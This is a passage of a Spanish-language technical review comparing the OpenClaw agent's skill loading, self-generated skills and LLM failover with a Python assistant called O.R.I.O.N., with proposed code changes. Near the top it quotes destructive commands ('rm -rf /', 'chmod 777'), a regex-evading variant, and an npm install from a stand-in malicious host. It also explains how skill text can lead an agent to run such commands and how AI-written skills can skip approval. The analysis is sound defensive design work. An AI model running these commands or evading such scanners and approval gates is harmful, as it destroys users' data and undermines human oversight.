(`rm -rf /`) y `unsafe-permissions` (`chmod 777`) están clasificadas como **`warn`**, no como
`critical`. Un skill auto-generado que contenga esas cadenas en su cuerpo se aplica igual.

Se puede argumentar que el cuerpo de un SKILL.md es **prompt**, no código ejecutable, así que
`rm -rf /` ahí es texto inerte. Es cierto a medias: es texto que el modelo va a leer como
instrucción y que puede reproducir en una tool-call de `bash`. La distinción "texto vs. código"
se difumina cuando el lector es un agente con herramientas.

Además, un escáner basado en regex tiene el mismo techo que cualquier regex: **es evadible**.
`rm${IFS}-rf` o una descripción en prosa ("borrá recursivamente la raíz del disco") no matchean.

---

### 7.3 El `install` spec ejecuta gestores de paquetes, y la validación es sintáctica

`[VERIFICADO EN CÓDIGO]` — sección 2.7.

El frontmatter de un skill puede declarar `install` con `brew` / `npm` / `pip` etc. Las
validaciones son buenas contra **inyección de argumentos** (rechazan `-` inicial, `\`, `..`,
`://`, espacios, protocolos que no sean http(s)) — es decir, impiden que un spec convierta un
`npm install foo` en `npm install --ignore-scripts=false -g http://malo/x`.

Pero **no validan qué paquete es**. `npm install <cualquier-paquete-válido>` pasa. Y `npm install`
ejecuta `postinstall` scripts. La barandilla es contra la manipulación del comando, no contra la
elección del paquete. Es la barandilla correcta para el problema que resuelve, pero es fácil
leerla como más protección de la que da.

---

### 7.4 Descartes silenciosos, y una asimetría de diagnóstico

`[VERIFICADO EN CÓDIGO]` — sección 3.

Hay al menos tres formas en que un skill puede desaparecer sin que el usuario se entere:

1. **Falta `description`** → `loadSingleSkillDirectory()` hace `if (!name || !description) return null;`
   Descarte **silencioso**. En cambio, un **error de parseo** del frontmatter sí produce un
   diagnóstico. La asimetría es contraintuitiva: el error obvio (YAML roto) avisa, el error sutil
   (campo faltante) no.
2. **Elegibilidad no satisfecha** (`requires.bins`, `requires.env`, `requires.config`, `os`) →
   filtrado silencioso. Es la decisión correcta para un skill opcional (`peekaboo` en Linux no
   debe gritar), pero significa que un `requires.env` mal escrito hace desaparecer el skill sin
   pista alguna.
3. **Sombreado por precedencia** → si dos fuentes definen el mismo `name`, gana la última y la
   primera desaparece sin aviso. Sin advertencia de colisión. `[HALLAZGO NEGATIVO]`

Los tres juntos producen el peor síntoma posible para un usuario: *"mi skill no se carga y no me
dice por qué"*.

---

### 7.5 No hay versionado ni dependencias entre skills

`[VERIFICADO EN CÓDIGO]` `[HALLAZGO NEGATIVO]` — sección 3.8.

- **No hay semver de skills.** Existe un campo `version` que va al prompt, pero **no se compara,
  no se valida y no gobierna nada**. Es una etiqueta informativa.
- **No hay dependencias skill→skill.** `requires` cubre binarios, variables de entorno, config y
  sistema operativo — pero **no otros skills**. No se puede declarar "este skill necesita que
  `gh-issues` esté cargado".
- **No hay orden de carga.** Los skills son independientes; no hay grafo, no hay resolución
  topológica.

Esto **no es necesariamente un defecto**: es una simplificación consciente que evita todo el
infierno de la resolución de dependencias. Pero conviene registrarlo para no asumir que existe.

---

### 7.6 El `name` no se valida como slug al cargar

`[VERIFICADO EN CÓDIGO]` `[HALLAZGO NEGATIVO]`

La documentación describe `name` como un identificador tipo slug. En la carga real, `name` se
normaliza y hace *fallback* al nombre del directorio, pero **no se valida** contra un patrón. Los
nombres de **comandos** sí se sanean y deduplican (`command-specs.ts`), pero el `name` del skill no.

Consecuencia práctica: el único campo verdaderamente obligatorio es `description`. Un `SKILL.md`
sin `name` carga igual, tomando el nombre de su carpeta.

---

### 7.7 Funcionalidad documentada sin un solo uso real

`[AFIRMACIÓN DE DOCUMENTACIÓN]` no respaldada por uso `[VERIFICADO EN CÓDIGO]`:

| Funcionalidad | Documentada | Uso real encontrado |
|---|---|---|
| `command-dispatch` en frontmatter | Sí, con tabla en `docs/tools/creating-skills.md` | **Cero skills** la usan. Solo docs + 2 tests |
| `always: true` (bypass de elegibilidad) | Sí | **Cero skills** la usan |

No significa que estén rotas — los tests pasan. Significa que son **superficie no ejercitada en
producción**, y por tanto la clase de código donde los bugs sobreviven. Para O.R.I.O.N. es una
señal directa: **no portar estas dos características**, no hay evidencia de que valgan su coste.

---

### 7.8 "Failover automático entre proveedores": la afirmación está a medias

`[AFIRMACIÓN DE DOCUMENTACIÓN]` **parcialmente no respaldada** — sección 6.

La máquina de estados existe y es excelente. Lo que **no** existe es lo que un lector desprevenido
entiende por "failover automático": que el sistema **descubra por su cuenta** un proveedor
alternativo con credenciales válidas y salte ahí.

`agents.defaults.model.fallbacks` está **vacío por defecto** (`resolveAgentModelFallbackValues()`
devuelve `[]`; no hay defaults en `src/agents/defaults.ts` ni en `src/config/defaults.ts`). Sin esa
lista escrita a mano, toda la maquinaria de 3.700 líneas se reduce a reintentar sobre el mismo
modelo y sondear su recuperación.

Lo llamativo es que **la información para automatizarlo existe**: el `ModelRegistry` tiene
`getAvailable()` y `hasConfiguredAuth(model)`, y el catálogo conoce `compat` y `cost` de cada
modelo. Se podría derivar una cadena por defecto ("otros modelos con auth configurada, de
capacidad comparable, ordenados por coste"). **No se hace.** Es una decisión, no una carencia
técnica: saltar a un modelo que el usuario no eligió tiene implicaciones de coste y privacidad que
OpenClaw prefiere no tomar por su cuenta.

Es interesante contrastarlo con la sección 4: **OpenClaw auto-aplica skills generados por sí mismo
sin preguntar, pero no se atreve a cambiar de proveedor LLM sin que el usuario lo liste**. La
calibración de autonomía es inconsistente entre subsistemas.

---

### 7.9 La clasificación de errores es regex sobre lenguaje natural

`[VERIFICADO EN CÓDIGO]` — sección 6.4.

`failover-matches.ts` clasifica fallos matcheando texto de error en inglés y chino, con patrones
que incluyen códigos propietarios (`"code": 1113` de Z.ai, `"InvalidSubscription"` de Volcengine)
y comentarios que citan issues (`#32828`, `#48988`, `#90702`).

Es frágil por construcción: cualquier proveedor puede cambiar la redacción de su mensaje de error
y romper la clasificación silenciosamente — el fallo degradaría a `"unclassified"`, que es
tratado como transitorio y **consume presupuesto de probe**. Un cambio de wording upstream puede,
en teoría, convertir un error permanente en reintentos indefinidos.

No hay alternativa mejor con los proveedores actuales. Pero es deuda estructural, no elegancia.

---

### 7.10 Rendimiento y coste de la carga de skills

`[VERIFICADO EN CÓDIGO]`

- La carga de skills es **síncrona y por archivo** (`readSkillFileSync`, `loadSkillsFromDirSafe`),
  sobre hasta **6 fuentes** de directorios. Escala linealmente con la cantidad de skills y es I/O
  de arranque.
- Cada skill aporta `name` + `description` + `location` + `version` al bloque
  `<available_skills>` del prompt del sistema. Con 50 skills, eso son **tokens en cada llamada**.
  El diseño *lazy* (el cuerpo solo se carga si el modelo lo pide con `read`) mitiga el problema
  grande, pero el índice sigue siendo coste fijo por turno.
- No hay paginación ni filtrado por relevancia del bloque `<available_skills>`: van todos los
  elegibles. `[HALLAZGO NEGATIVO]`

---

### 7.11 El descubrimiento de skills depende del criterio del modelo

`[VERIFICADO EN CÓDIGO]` — es la contrapartida del diseño *lazy* (sección 3.4).

Que un skill se use o no depende de que el modelo **decida** que su `description` es relevante y
haga `read`. No hay determinismo, no hay traza de "por qué no se usó", y la calidad del sistema
queda atada a la calidad de la redacción de las descripciones.

Esto es una debilidad **relativa a O.R.I.O.N.**, no absoluta: para OpenClaw, un asistente de
codificación de propósito abierto, delegar el enrutado al modelo es razonable. Para un asistente
personal con intents cerrados y latencia importante, un clasificador determinista (TF-IDF+SVM)
da respuestas reproducibles y auditables. **Son dos filosofías, y O.R.I.O.N. eligió la otra por
buenas razones.** Se desarrolla en 8.2.

---

### 7.12 Complejidad acumulada

`[VERIFICADO EN CÓDIGO]` — observación estructural.

- 172 archivos mencionan failover.
- `ModelCatalogCompatConfig` tiene **31 flags**, 7 formatos de "thinking" y 7 niveles.
- El subsistema de skills reparte responsabilidades entre `loading/`, `discovery/`, `research/`,
  `workshop/`, `security/`, más `packages/markdown-core` y `src/shared/`.
- `resolveFallbackCandidateCacheKey()` construye una clave de caché con **once componentes**,
  incluyendo huellas del plugin control plane y del registry.

Nada de esto es gratuito: cada pieza responde a un problema real de producción, y muchos
comentarios citan el issue que la originó. Pero **es el resultado de años de casos límite, no un
diseño que se pueda copiar de una pieza**. Portar esta complejidad a O.R.I.O.N. hoy sería
sobre-ingeniería pura. La sección 8 separa explícitamente qué adoptar de qué dejar.

---

## 8. Traducción a O.R.I.O.N.

Destino: `c:\Users\johan\Documentos\Apps\Agent IA\agente_ia\` (Python 3.12+).

Regla de esta sección: para cada pieza, **qué adoptar**, **qué hacer distinto y mejor**, y **qué
sería sobre-ingeniería**. Sin recomendaciones genéricas.

---

### 8.0 Estado actual de O.R.I.O.N., verificado

Antes de recomendar nada, se leyó el código real. `[VERIFICADO EN CÓDIGO]`

| Módulo | Líneas | Estado |
|---|---:|---|
| `skills/base_skill.py` | 44 | `BaseSkill` con `name`, `description`, `get_intents()`, `get_training_data()`, `extract_params(intent, text)`, `execute(intent, params)` |
| `skills/skill_manager.py` | 113 | auto-descubrimiento por `importlib`, `_intent_to_skill`, `get_agent_tools()` con gate de seguridad REQ-005 |
| `skills/skill_creator_skill.py` | 337 | crea/modifica/borra skills vía LLM, escribe `.py` en `skills/`, hot-reload |
| `ai/llm_provider.py` | 277 | `generate_response()` + `_ask_anthropic/_ask_gemini/_ask_ollama/_ask_openai/_ask_deepseek`, caché LRU |

Dos observaciones que cambian el enfoque de las recomendaciones:

**(1) O.R.I.O.N. YA tiene fallback de proveedor.** No es un hueco a llenar, es algo a mejorar:

```python
# ai/llm_provider.py — código actual
def generate_response(messages, system_prompt, image_path=None):
    provider, vision_provider, fallback_provider, model_name = get_provider_config()
    active_provider = provider
    if image_path and os.path.exists(image_path):
        if vision_provider:
            active_provider = vision_provider
    try:
        response = _cached_call(active_provider, messages, system_prompt, image_path, model_name)
        if "Error:" in response and fallback_provider and fallback_provider != active_provider:
            raise Exception(response)
        return response
    except Exception as e:
        if fallback_provider and fallback_provider != active_provider:
            try:
                if fallback_provider == "ollama":
                    fallback_resp = _ask_ollama(messages, system_prompt, image_path, "qwen3:8b")
                else:
                    fallback_resp = _uncached_call(fallback_provider, messages, system_prompt, image_path, model_name)
                return f"[Fallback activado. Proveedor original falló por: {str(e)}]\n{fallback_resp}"
            except Exception as e2:
                return f"Error en proveedor principal ({str(e)}) y también en el de emergencia ({str(e2)})."
        return f"Error ({active_provider}): {str(e)}"
```

Comparado con OpenClaw (sección 6), esto tiene:
- **un solo** nivel de fallback (OpenClaw: cadena ordenada de N);
- **cero** clasificación de error — cualquier excepción dispara fallback, incluso un bug de
  parseo local que va a fallar igual en el otro proveedor (OpenClaw: 16 `FailoverReason`);
- **cero** reintentos con backoff antes de saltar (OpenClaw: retry → rotar credencial → cambiar);
- **cero** cooldown: si el primario está caído, cada llamada vuelve a intentarlo y a fallar
  (OpenClaw: cooldown con probes throttleados);
- **detección de error por substring `"Error:"` en la respuesta** — frágil: una respuesta legítima
  del modelo que contenga el texto "Error:" dispara un fallback innecesario;
- `"qwen3:8b"` **hardcodeado** como modelo de Ollama en el camino de fallback;
- `except Exception` que devuelve el error como **string de respuesta**, mezclando el canal de
  datos con el de errores.

**(2) El gate de seguridad de REQ-005 es un activo que OpenClaw no tiene.** `skill_manager.py`
documenta la invariante en el docstring de `execute()`, y `get_agent_tools()` envuelve cada
herramienta en `_make_gated_tool_fn`, que llama `security_manager.require_confirmation()`.
OpenClaw **no tiene equivalente**: su `approvalPolicy` es `"auto"` por defecto y el camino de
autocaptura lo puentea por completo. **En gobernanza, O.R.I.O.N. ya está por delante.** Esto es
central para la sección 9.

---

### 8.1 Frontmatter y metadatos de skill

O.R.I.O.N. no tiene frontmatter: sus skills son clases Python. La pregunta correcta **no** es
"¿adoptamos SKILL.md?" sino "¿qué información del frontmatter de OpenClaw le falta a `BaseSkill`?".

#### Adoptar: `requires` — declaración de dependencias de runtime

Es la pieza más valiosa del frontmatter y la que O.R.I.O.N. no tiene en absoluto. Hoy, si una skill
necesita `ffmpeg` o `SPOTIFY_TOKEN` y no está, falla **en tiempo de ejecución** con un error opaco.

Traducción directa y mínima:

```python
# skills/base_skill.py — adición propuesta
from typing import Dict, List, Any, Optional

class SkillRequirements:
    """Requisitos de runtime declarados por una skill."""
    def __init__(
        self,
        bins: Optional[List[str]] = None,
        any_bins: Optional[List[str]] = None,
        env: Optional[List[str]] = None,
        os_names: Optional[List[str]] = None,
    ) -> None:
        self.bins = bins or []
        self.any_bins = any_bins or []
        self.env = env or []
        self.os_names = os_names or []


class BaseSkill:
    def get_requirements(self) -> Optional[SkillRequirements]:
        """Devolver los requisitos de runtime, o None si no tiene."""
        return None

    def is_eligible(self) -> bool:
        """Indicar si la skill puede operar en este entorno."""
        ...
```

Semántica a copiar tal cual de OpenClaw (`src/shared/config-eval.ts`): **elegibilidad no
satisfecha = skill filtrada, no error**. Una skill de Windows en Linux no debe romper el arranque.

#### Hacer distinto y mejor: no filtrar en silencio

Esta es la debilidad 7.4 de OpenClaw. O.R.I.O.N. **debe** registrar el motivo:

```python
if not skill.is_eligible():
    logger.info(
        "skill %s omitida: requisitos no satisfechos (%s)",
        skill.name, skill.explain_ineligibility(),
    )
    continue
```

Y exponerlo al usuario: un comando `skills` que liste las **cargadas** y las **omitidas con su
motivo**. Es barato y elimina de raíz el peor síntoma de OpenClaw ("no carga y no sé por qué").

#### Adoptar: separar `name` de `display_name`, y hacer `description` obligatoria de verdad

En OpenClaw `description` es el único campo realmente obligatorio, porque **es lo que el modelo
lee para decidir**. En O.R.I.O.N. `BaseSkill.description` tiene default `"Sin descripción"` — es
decir, es opcional de facto. Debería fallar ruidosamente en carga, porque alimenta el panel de
ayuda y, si se adopta 8.2, la herramienta del agente.

#### Sobre-ingeniería: NO portar

| Pieza | Por qué no |
|---|---|
| `SKILL.md` con YAML + JSON5 anidado | O.R.I.O.N. usa clases Python. El metadato ya vive junto al código; un archivo aparte solo añade desincronización |
| `command-dispatch` | **Cero skills reales lo usan** (7.7). No hay evidencia de valor |
| `always: true` | **Cero skills reales lo usan** (7.7) |
| `install` spec (brew/npm/pip) | Riesgo alto (7.3), beneficio nulo hoy. O.R.I.O.N. tiene `requirements.txt` |
| Seis fuentes con precedencia | O.R.I.O.N. tiene **una** carpeta `skills/`. Una segunda (usuario/workspace) puede tener sentido más adelante; seis, nunca |
| `WORKSPACE_SKILLS_PROMPT_FORMAT_VERSION` | Versionado de un formato de prompt que O.R.I.O.N. no tiene |

---

### 8.2 Enrutado: carga perezosa dirigida por el modelo vs. clasificador determinista

Este es el contraste arquitectónico central entre los dos sistemas, y merece una respuesta
matizada en vez de un "adoptar/no adoptar".

```
  OpenClaw                              O.R.I.O.N.
  ────────                              ──────────
  <available_skills> en el prompt       get_training_data() → TF-IDF + SVM
  (name + description + location)                │
          │                                      │
  el MODELO decide y hace `read`         el CLASIFICADOR decide, offline
          │                                      │
  latencia: +1 turno                     latencia: ~0
  coste: tokens del índice               coste: 0 tokens
  determinismo: ninguno                  determinismo: total
  cobertura: abierta                     cobertura: intents cerrados
  auditabilidad: baja                    auditabilidad: alta
```

**Veredicto: O.R.I.O.N. debe conservar su clasificador.** Para un asistente personal con acciones
de sistema, latencia baja y un `security_manager` que clasifica por intent, el determinismo no es
una limitación: **es un requisito de la arquitectura de seguridad**. Si el modelo eligiera la skill
libremente, el gate verde/amarillo/rojo tendría que evaluarse sobre una decisión no reproducible.

Lo que sí conviene adoptar es la **idea** detrás de `description`, no el mecanismo:

- En OpenClaw, `description` cumple el papel que en O.R.I.O.N. cumple `get_training_data()`: es la
  superficie por la que la skill se hace descubrible.
- O.R.I.O.N. tiene **las dos** superficies (`description` y `get_training_data()`) pero solo usa
  una para enrutar. La segunda vía útil es el **fallback**: cuando el clasificador no supera el
  umbral de confianza, en vez de responder "no entendí", pasarle al LLM la lista de
  `name: description` de las skills elegibles y dejar que sugiera una. Híbrido: determinista
  primero, modelo como red de seguridad.

Eso da lo mejor de ambos sin pagar el coste de tokens en cada turno (el índice solo se envía en el
camino de baja confianza).

---

### 8.3 Ciclo de vida y descubrimiento

#### Adoptar: lectura defensiva y aislamiento de fallos

`loadSkillsFromDirSafe()` de OpenClaw nunca deja que un skill roto tumbe la carga. O.R.I.O.N. ya
hace algo parecido, pero con un defecto concreto `[VERIFICADO EN CÓDIGO]`:

```python
# skills/skill_manager.py — actual
except Exception as e:
    print(f"[SkillManager] Falla al inicializar {attr_name}: {e}")
```

Dos problemas contra `.claude/rules/python-style.md`: usa `print()` en vez de `logging`, y el
`spec.loader.exec_module(module)` de la línea anterior **no está dentro de ningún `try`** — un
`SyntaxError` o un import fallido en un archivo de `skills/` **aborta la carga entera**. Es
exactamente el fallo que `loadSkillsFromDirSafe` previene. Corrección mínima:

```python
try:
    spec.loader.exec_module(module)
except Exception as e:
    logger.error("skill %s no se pudo importar: %s", filename, e)
    continue
```

Esto es más urgente ahora que `skill_creator_skill.py` **escribe archivos `.py` generados por un
LLM** en esa misma carpeta: un solo archivo generado con un error de sintaxis deja a O.R.I.O.N.
sin ninguna skill.

#### Adoptar: procedencia (`source`) en cada skill

OpenClaw etiqueta cada skill con su origen, y cada fila del catálogo y cada candidato de failover
con el suyo. Es un patrón repetido y barato. En O.R.I.O.N., con `skill_creator_skill.py` generando
skills, distinguir `"builtin"` de `"generada"` es **necesario** para: mostrarlo al usuario, filtrar
qué se puede borrar automáticamente, y auditar.

Se puede derivar del encabezado que ya escribe el creador
(`# Skill generada automáticamente por SkillCreator de O.R.I.O.N.`), pero es más limpio como
atributo de clase.

#### Hacer distinto y mejor: detectar colisiones de intent

`skill_manager.register_skill()` hace `self._intent_to_skill[intent] = skill` sin comprobar si la
clave ya existía. Es el mismo "last-writer-wins" silencioso que OpenClaw (7.4), y con skills
generadas por LLM el riesgo de colisión es **alto**: nada impide que una skill nueva declare
`OPEN_APP`. Mínimo:

```python
for intent in skill.get_intents():
    previo = self._intent_to_skill.get(intent)
    if previo is not None and previo is not skill:
        logger.warning(
            "colisión de intent '%s': %s reemplaza a %s",
            intent, skill.name, previo.name,
        )
    self._intent_to_skill[intent] = skill
```

#### Sobre-ingeniería: NO portar

- **Lectura anti-symlink con `realpathSync` + fd + `maxBytes`.** Resuelve un modelo de amenaza
  (skills de terceros descargados de un marketplace) que O.R.I.O.N. no tiene. Si algún día se
  descargan skills de fuentes externas, se revisa.
- **`SkillSnapshot` por sesión.** O.R.I.O.N. es monoproceso y monousuario.
- **Deduplicación y saneado de nombres de comando.** No hay comandos de skill.

---

### 8.4 Autoría automática de skills

Desarrollado a fondo en la sección 4, y con implicaciones directas para REQ-013 (sección 9.2).

#### Adoptar: la plantilla determinista

El hallazgo más útil de toda la sección 4 es que **OpenClaw NO usa un LLM para generar el skill**.
`buildProposal()` produce una plantilla fija a partir de la instrucción extraída. El LLM solo
interviene, si acaso, en la revisión posterior.

O.R.I.O.N. hace lo contrario: `skill_creator_skill.py` le pide el código a un LLM y luego lo
procesa (`_process_generated_code`). Eso es **más potente y menos predecible**. Ambos enfoques
tienen sitio, pero merecen tratamientos de riesgo distintos:

| | Plantilla determinista | Generado por LLM |
|---|---|---|
| Resultado | reproducible, auditable, diffeable | variable |
| Puede introducir código arbitrario | no | **sí** |
| Nivel de seguridad apropiado | 🟡 Amarillo | 🔴 Rojo (es "modificar el propio código de O.R.I.O.N.") |

Según `.claude/rules/security-levels.md`, "Modificar/borrar el propio código de O.R.I.O.N." es
🔴 **Rojo**. Escribir un `.py` nuevo en `skills/` con código de un LLM cae de lleno ahí.

#### Adoptar: `skillWorkshopAvailable` — el gate de privilegio heredado

De las 9 salvaguardas de OpenClaw (sección 4.6), la conceptualmente más elegante. La autocaptura
solo auto-aplica si el contexto donde ocurre **ya tenía** permiso para usar el skill workshop.
Es decir: **la escritura automática nunca tiene más privilegio que la sesión que la originó**.

Traducción a O.R.I.O.N.: una propuesta de skill que nace en un turno de **Telegram** no debería
poder aplicarse con más autoridad que la que tiene ese canal. Encaja exactamente con la
clasificación por canal que ya está en `security-levels.md` ("Voz: solo acciones Verdes";
"Telegram/Discord: Rojo bloqueado").

#### Adoptar: exclusión de contextos no interactivos

```ts
const AUTO_CAPTURE_BLOCKED_TRIGGERS = new Set(["cron", "heartbeat", "memory", "overflow"]);
const AUTO_CAPTURE_BLOCKED_SESSION_SEGMENTS = new Set([
  "cron", "hook", "subagent", "skill-workshop-review",
]);
```

Un ritual proactivo (`core/proactive_engine.py`, `learning/routines_engine.py`) o un briefing
programado **no deben poder generar skills**: no hay un humano mirando. Es una regla de una línea
con mucho valor.

#### Adoptar: deduplicación por huella

OpenClaw usa SHA-256 de la señal con protocolo claim/release. O.R.I.O.N. no necesita el protocolo
de concurrencia (monoproceso), pero sí la huella: **la misma petición no debe generar dos
propuestas**.

#### Hacer distinto y mejor — LO CENTRAL

**El default `mode: "auto"` de OpenClaw es su peor decisión y O.R.I.O.N. no debe copiarla.**
Ni siquiera como opción. Ver 9.2: en O.R.I.O.N. una propuesta de skill dispara un **REQ formal**.

Segundo: **umbral de repetición**. OpenClaw no tiene ninguno — un mensaje basta. Una regla de
"una instrucción se propone como skill solo si aparece N veces en una ventana de M días" reduce el
falso positivo mucho más que endurecer las regex, y O.R.I.O.N. tiene la infraestructura para
medirlo (`memory.db`, `learning/routines_engine.py`).

Tercero: **detección por regex vs. por patrón de uso.** Las 17 regex de OpenClaw disparan sobre
*cómo se dice* algo ("de ahora en adelante", "siempre que"). O.R.I.O.N. ya observa *qué se hace*
repetidamente. Detectar candidatos a skill desde **rutinas observadas** es más robusto que desde
frases, y es una ventaja que OpenClaw no tiene.

#### Sobre-ingeniería: NO portar

- **Store SQLite con rollback por revisión y hashes.** Hay una alternativa mucho mejor en el
  contexto de O.R.I.O.N.: **git**. El proyecto ya está versionado y `.claude/rules/git.md` obliga
  a commits manuales del humano. El "rollback" es `git checkout`. Reimplementar versionado dentro
  de SQLite sería duplicar lo que git ya hace mejor.
- **Locks por target y colas serializadas por workspace.** Monoproceso.
- **Cuarentena como estado separado.** Con el pipeline de gobernanza, el estado equivalente es
  "REQ rechazado en QA", que ya existe.
- **Hooks de evaluación por plugin (advisory).** No hay sistema de plugins.

---

### 8.5 Registro de proveedores LLM — el refactor de mayor retorno

Es la recomendación más concreta y de mejor relación valor/esfuerzo de todo el documento.

#### Adoptar: indexar por PROTOCOLO, no por vendor

El hallazgo de 5.1. Hoy `_uncached_call()` es una cadena de `if/elif` por vendor, y cada
`_ask_*` reimplementa la construcción de mensajes. Pero **`openai`, `deepseek` y `ollama` hablan
el mismo protocolo** (chat completions estilo OpenAI): el 60% de `llm_provider.py` es duplicación.

```python
# ai/providers/registry.py — propuesta
from typing import Callable, Dict, List, Optional, Protocol

class ApiAdapter(Protocol):
    """Adaptador de un protocolo de API concreto (no de un vendor)."""
    api: str
    def stream(self, model: "ModelRef", messages: List[dict], system_prompt: str,
               image_path: Optional[str] = None) -> str: ...


class ApiRegistry:
    """Registro aislado de adaptadores, indexado por protocolo."""

    def __init__(self) -> None:
        self._adapters: Dict[str, ApiAdapter] = {}

    def register(self, adapter: ApiAdapter, source_id: Optional[str] = None) -> None:
        """Registrar un adaptador para su protocolo."""
        if adapter.api in self._adapters:
            logger.warning("adaptador de '%s' reemplazado", adapter.api)
        self._adapters[adapter.api] = adapter

    def get(self, api: str) -> Optional[ApiAdapter]:
        return self._adapters.get(api)
```

Con **tres** adaptadores (`openai-completions`, `anthropic-messages`, `google-generative-ai`)
O.R.I.O.N. cubre los cinco proveedores actuales y **cualquier vendor futuro compatible con
OpenAI** sin escribir código — solo una fila de catálogo con su `base_url` y su variable de
entorno. `deepseek`, `groq`, `together`, `openrouter`, `xai` entrarían gratis.

#### Adoptar: catálogo de modelos como DATO, no como código

Un `models.json` (o una tabla) con, por modelo: `provider`, `id`, `api`, `base_url`, `env_var`,
`context_window`, `supports_vision`, `cost`. Beneficios inmediatos y concretos:

- Elimina `"qwen3:8b"` hardcodeado en el camino de fallback.
- Elimina la elección manual de `vision_provider`: se deriva de `supports_vision`.
- Habilita `default_utility_model` (5.4.1): un modelo barato para clasificar, titular o resumir,
  en vez de gastar el principal.

#### Adoptar: `compat` en versión mínima

No las 31 flags de OpenClaw. Empezar con las 4 que O.R.I.O.N. necesita hoy:
`supports_vision`, `supports_tools`, `max_tokens_field`, `supports_temperature`. Lo importante es
el **patrón** (dato declarativo en vez de `if provider == ...`), no el volumen.

#### Adoptar: la separación de las tres preguntas

Catálogo (*¿con quién?*) / registro (*¿cómo se habla?*) / auth (*¿tengo credencial?*).
`llm_provider.py` hoy responde las tres dentro de cada `_ask_*`. Separarlas es el núcleo de
REQ-015.

#### Adoptar: `find_env_keys()` con precedencia declarada como orden de lista

De `env-api-keys.ts` (5.5). Una tabla `provider → [VAR1, VAR2]` donde el orden **es** la
precedencia, y una función que responda "¿este proveedor tiene credencial?" — que es lo que
necesita `get_available_models()` para no ofrecer modelos inalcanzables.

#### Hacer distinto y mejor: no devolver errores como string

`llm_provider.py` devuelve `"Error: ANTHROPIC_API_KEY no está configurada."` **como si fuera la
respuesta del modelo**. Eso obliga al `"Error:" in response` de `generate_response()`, que es
frágil (7.8 / 8.0) y confunde el canal de datos con el de control. Excepciones tipadas:

```python
class LLMError(Exception):
    """Error de una llamada a un proveedor LLM."""
    def __init__(self, message: str, reason: "FailoverReason", provider: str) -> None:
        super().__init__(message)
        self.reason = reason
        self.provider = provider
```

#### Sobre-ingeniería: NO portar

- **Registro perezoso con `import()` diferido y memoizado.** En Python, `import anthropic` dentro
  de la función (lo que `llm_provider.py` **ya hace**) logra el mismo efecto sin maquinaria.
- **`sourceId` y desregistro en bloque.** No hay plugins.
- **Contrato 100% streaming.** OpenClaw es un TUI que muestra tokens según llegan. O.R.I.O.N. es
  voz + Telegram + GUI: request/response es adecuado. Streaming sería un REQ propio, no un
  subproducto del refactor.
- **`provider-index` con `expectedIntegrity` y `minHostVersion`.** No hay proveedores instalables.
- **`Symbol` no enumerable + `WeakMap`.** Idioma de JS sin problema equivalente aquí.

---

### 8.6 Failover — mejorar lo que ya existe, sin copiar 3.700 líneas

O.R.I.O.N. ya tiene fallback (8.0). Estas son las mejoras ordenadas por relación valor/coste:

#### 1. Adoptar `FailoverReason` (coste: bajo, valor: alto)

El enum de 16 razones (6.4) es la pieza más portable de la sección 6. Con **6** alcanza para
empezar:

```python
from enum import Enum

class FailoverReason(str, Enum):
    """Motivo clasificado del fallo de una llamada a un proveedor."""
    AUTH = "auth"                    # credencial inválida o ausente
    RATE_LIMIT = "rate_limit"        # 429, cuota
    OVERLOADED = "overloaded"        # 503, sobrecarga
    TIMEOUT = "timeout"
    CONTEXT_OVERFLOW = "context_overflow"
    UNKNOWN = "unknown"
```

Lo importante es la **consecuencia**, no el enum: hoy O.R.I.O.N. hace fallback ante **cualquier**
excepción, incluido un `KeyError` propio que va a repetirse idéntico en el otro proveedor. Con
clasificación:

| Razón | Acción correcta |
|---|---|
| `AUTH` | **no** reintentar, **no** cachear el fallo, avisar al usuario que falta la clave |
| `RATE_LIMIT` / `OVERLOADED` | reintentar con backoff; si persiste, siguiente proveedor; **cooldown** |
| `TIMEOUT` | reintentar una vez; luego siguiente proveedor |
| `CONTEXT_OVERFLOW` | **no** cambiar de proveedor: recortar el historial y reintentar |
| `UNKNOWN` (excepción local) | **no** hacer fallback: es un bug, y el segundo proveedor fallará igual |

La última fila sola ya justifica el cambio.

#### 2. Adoptar backoff con jitter (coste: bajo, valor: alto)

De `packages/retry` (6.8). En Python son ~15 líneas. Las tres cosas que importan: exponencial con
tope, jitter aleatorio, y **honrar `Retry-After`** cuando el proveedor lo manda (todos los grandes
lo hacen en un 429).

#### 3. Adoptar cadena ordenada en vez de un solo fallback (coste: medio, valor: medio)

`fallback_provider: "ollama"` → `"fallbacks": ["openai/gpt-4o-mini", "ollama/qwen3:8b"]`,
recorrida en orden con deduplicación. Con el catálogo de 8.5 el ref `provider/model` ya es la
unidad natural. **Y hacerlo mejor que OpenClaw**: derivar una cadena por defecto de los modelos
con credencial configurada (7.8) — la información está y O.R.I.O.N. es monousuario, así que la
objeción de coste/privacidad de OpenClaw pesa mucho menos.

#### 4. Adoptar cooldown (coste: medio, valor: medio)

Si el primario falló por `RATE_LIMIT`, no volver a intentarlo en los próximos N minutos: ir
directo al siguiente. Hoy cada turno paga el timeout de un proveedor que se sabe caído. Un
`dict[provider, timestamp]` con `MIN_PROBE_INTERVAL` es suficiente; el aparato de probes
throttleados y presupuestos de OpenClaw no hace falta.

#### 5. Adoptar `can_fallback_after_error` (coste: bajo, valor: alto en seguridad)

De `runWithModelFallback` (6.2). **Si el turno fallido ya ejecutó una acción amarilla, reintentar
duplicaría el efecto secundario.** Con acciones que apagan el PC o mandan mensajes de Telegram,
esto no es teórico. Un flag "este turno ya cometió efectos" que veta el reintento es barato y
evita una clase entera de bugs graves. Conecta directamente con `security_manager`.

#### Corregir: el bug de caché + fallback

`[VERIFICADO EN CÓDIGO]` — problema real en el código actual. `_cached_call()` guarda en
`_response_cache` **el resultado de `_uncached_call()` sin distinguir éxito de error**. Como los
errores se devuelven como strings (`"Error: ..."`), **un fallo queda cacheado**: durante las
siguientes 100 entradas, la misma pregunta devuelve el error cacheado **sin volver a intentar** —
y como `generate_response()` convierte ese `"Error:"` en excepción, dispara el fallback una y otra
vez sin tocar nunca al primario recuperado. Se arregla solo con no cachear fallos (y se arregla
mejor con excepciones tipadas, 8.5).

#### Sobre-ingeniería: NO portar

- **Rotación de perfiles de credencial** (`rotate_profile`). O.R.I.O.N. tiene una clave por
  proveedor.
- **`failover-matches.ts` con regex multi-idioma y códigos propietarios.** Clasificar por **status
  HTTP** (401/403 → `AUTH`, 429 → `RATE_LIMIT`, 5xx → `OVERLOADED`) y por tipo de excepción del
  SDK cubre el 90% con el 5% del código. Añadir patrones solo cuando un fallo real lo exija.
